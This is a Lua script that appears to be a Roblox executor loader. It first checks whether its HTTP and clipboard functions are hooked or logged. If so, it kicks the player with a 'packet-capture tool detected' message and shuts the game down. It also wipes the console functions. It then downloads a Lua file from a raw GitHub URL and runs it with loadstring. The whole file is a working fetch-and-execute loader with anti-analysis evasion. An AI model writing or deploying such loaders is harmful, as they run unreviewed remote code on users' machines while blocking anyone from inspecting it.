

local function selfDestruct(reason)
    pcall(function()
        for _, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end
    end)
    task.wait(0.5)
    pcall(function()
        game.Players.LocalPlayer:Kick("检测到抓包工具")
    end)
    pcall(game.Shutdown, game)
end

local function checkHooks()
    if not isfunctionhooked then
        return false
    end
    local hooks = {
        game.HttpGet,
        game.HttpPost,
        tostring,
        setclipboard,
        request,
        http_request,
    }
    for _, func in ipairs(hooks) do
        if func and isfunctionhooked(func) then
            return true
        end
    end
    if isfolder then
        for _, folder in ipairs({"HttpGetFolder", "WebhookFolder", "RequestFolder"}) do
            if isfolder(folder) then
                return true
            end
        end
    end
    return false
end


for _, name in pairs({"rconsoleprint", "rconsolewarn", "rconsoleinfo", "rconsoleerr", "rconsoletitle", "clonefunction"}) do
    pcall(function()
        if getgenv()[name] then
            getgenv()[name] = nil
        end
    end)
end


if isfunctionhooked then
    if checkHooks() then
        selfDestruct()
    else
        spawn(function()
            local startTime = os.clock()
            while os.clock() - startTime < 60 do
                task.wait(2)
                if checkHooks() then
                    selfDestruct()
                    break
                end
            end
        end)
    end
end


pcall(function()
    local url = "https://raw.githubusercontent.com/czcasdfwdk/dyk-jzq-czc/main/dykjzqjzq2-czc.lua"
    local content = game:HttpGet(url, true)
    if content and #content > 100 then
        
        local fn = loadstring(content)
        if fn then
            
            pcall(fn)
        end
    end
end)
